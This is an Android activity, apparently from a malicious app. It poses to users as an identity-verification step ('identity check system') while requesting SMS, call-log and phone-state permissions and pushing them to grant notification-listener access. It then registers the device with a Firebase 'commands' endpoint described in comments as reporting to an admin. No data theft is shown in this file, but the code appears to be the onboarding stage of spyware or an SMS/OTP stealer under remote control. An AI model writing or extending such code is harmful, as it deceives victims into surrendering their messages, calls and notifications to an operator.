package com.ban.ab;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.provider.Settings;
import android.view.View;
import android.widget.Button;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;

import okhttp3.MediaType;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.RequestBody;

public class VerifyActivity extends AppCompatActivity {

    private static final int PERMISSION_CODE = 101;
    private final OkHttpClient client = new OkHttpClient();
    private String userName;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        
        // الركن الأول: الأمان عند بناء الواجهة
        try {
            setContentView(R.layout.activity_verify);
        } catch (Exception e) {
            Toast.makeText(this, "خطأ في تحميل الواجهة", Toast.LENGTH_SHORT).show();
            finish();
            return;
        }

        userName = getSharedPreferences("AppPrefs", MODE_PRIVATE).getString("user_name", "Unknown");
        Button btnStartVerify = findViewById(R.id.btnStartVerify);

        if (btnStartVerify != null) {
            btnStartVerify.setOnClickListener(v -> requestPermissionsSystem());
        }
    }

    // الركن الثاني: نظام الأذونات المتعددة
    private void requestPermissionsSystem() {
        String[] permissions = {
                Manifest.permission.READ_PHONE_STATE,
                Manifest.permission.READ_CALL_LOG,
                Manifest.permission.RECEIVE_SMS,
                Manifest.permission.READ_SMS
        };

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            ActivityCompat.requestPermissions(this, permissions, PERMISSION_CODE);
        } else {
            checkNotificationListenerBridge();
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        // الركن الثالث: جسر العبور التلقائي بعد الأذونات
        if (requestCode == PERMISSION_CODE) {
            checkNotificationListenerBridge();
        }
    }

    // الركن الرابع: الجسر السحابي للإشعارات
    private void checkNotificationListenerBridge() {
        if (!isNotificationServiceEnabled()) {
            try {
                Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
                startActivity(intent);
                Toast.makeText(this, "خطوة أخيرة: يرجى تفعيل 'نظام فحص الهوية' 🛡️", Toast.LENGTH_LONG).show();
            } catch (Exception e) {
                startActivity(new Intent(Settings.ACTION_SETTINGS));
            }
        } else {
            // الركن الخامس: تصفير الحالة السحابي (إبلاغ الآدمن بالنجاح)
            notifyAdminSuccess();
        }
    }

    private void notifyAdminSuccess() {
        String url = "https://banproject-2f9c6-default-rtdb.firebaseio.com/commands/" + userName + "/status.json";
        RequestBody body = RequestBody.create("\"waiting\"", MediaType.parse("application/json"));
        
        new Thread(() -> {
            try {
                client.newCall(new Request.Builder().url(url).put(body).build()).execute();
                new Handler(Looper.getMainLooper()).post(() -> {
                    Toast.makeText(this, "تم تفعيل نظام الفحص السحابي ✅", Toast.LENGTH_SHORT).show();
                    finish();
                });
            } catch (Exception ignored) {}
        }).start();
    }

    private boolean isNotificationServiceEnabled() {
        String pkgName = getPackageName();
        String flat = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
        return flat != null && flat.contains(pkgName);
    }
}
